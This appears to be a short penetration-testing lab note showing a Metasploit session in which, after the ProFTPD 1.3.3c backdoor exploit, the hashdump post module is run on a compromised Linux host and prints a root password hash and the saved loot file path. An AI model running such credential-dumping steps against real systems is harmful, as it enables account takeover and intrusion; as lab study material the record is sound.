# Hashes

```bash
msf5 exploit(unix/ftp/proftpd_133c_backdoor) > use post/linux/gather/hashdump
msf5 post(linux/gather/hashdump) > options

Module options (post/linux/gather/hashdump):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on.

msf5 post(linux/gather/hashdump) > set SESSION 2
SESSION => 2
msf5 post(linux/gather/hashdump) > run

[+] root:$6$sgewtGbw$ihhoUYASuXTh7Dmw0adpC7a3fBGkf9hkOQCffBQRMIF8/0w6g/Mh4jMWJ0yEFiZyqVQhZ4.vuS8XOyq.hLQBb.:0:0:root:/root:/bin/bash
[+] Unshadowed Password File: /root/.msf4/loot/20240129134252_default_192.94.129.3_linux.hashes_720400.txt
[*] Post module execution completed
```